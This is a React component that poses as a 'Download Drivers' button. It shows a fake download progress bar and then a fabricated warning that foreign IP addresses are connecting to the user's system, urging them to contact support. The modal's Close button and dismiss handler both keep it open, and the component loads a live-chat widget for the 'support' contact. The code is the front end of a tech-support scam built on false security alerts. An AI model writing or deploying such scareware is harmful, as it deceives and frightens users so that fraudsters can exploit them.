"use client"
import { useState, useEffect } from 'react';
import { Modal, Button } from 'react-bootstrap';

const DownloadButton = () => {
  const [showModal, setShowModal] = useState(false);
  const [progress, setProgress] = useState(0);
  const [stage, setStage] = useState('start');

  const handleDownload = () => {
    setShowModal(true);
    setProgress(0);
    setStage('start');

    // Simulate download progress
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 90) {
          clearInterval(interval);
          setStage('contact');
          return prev;
        }
        return prev + 10;
      });
    }, 500);
  };
  useEffect(() => {
    // Create a script element
    const script = document.createElement("script");
    script.src = "https://code.jivosite.com/widget/hLljwWDcZ2"; // Replace with your actual JivoChat script URL
    script.async = true;
    script.onload = () => {
      console.log("JivoChat script loaded successfully");
    };
    script.onerror = () => {
      console.error("Failed to load JivoChat script");
    };
    // Append the script to the body
    document.body.appendChild(script);

    // Clean up script on component unmount
    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <Button variant="primary" onClick={handleDownload}>
      <i className="fas fa-download"></i> Download Drivers
      </Button>

      <Modal show={showModal} onHide={() => setShowModal(true)} centered>
        <Modal.Header closeButton>
          <Modal.Title>Important Drivers</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          {stage === 'start' && (
            <>
              <p>Downloading started...</p>
              <div className="progress">
                <div
                  className="progress-bar"
                  role="progressbar"
                  style={{ width: `${progress}%` }}
                >
                  {progress}%
                </div>
              </div>
            </>
          )}
          {stage === 'contact' && (
            <>
              <p>Warning: Foreign IP addresses Detected. </p>
          <p>Foreign IP addresses are attempting to connect to your system.</p>
         <p> Please contact support for assistance.</p>
         <Button>Contact us</Button>           </>
          )}
        </Modal.Body>
        <Modal.Footer>
          <Button variant="secondary" onClick={() => setShowModal(true)}>
            Close
          </Button>
        </Modal.Footer>
      </Modal>
    </>
  );
};

export default DownloadButton;
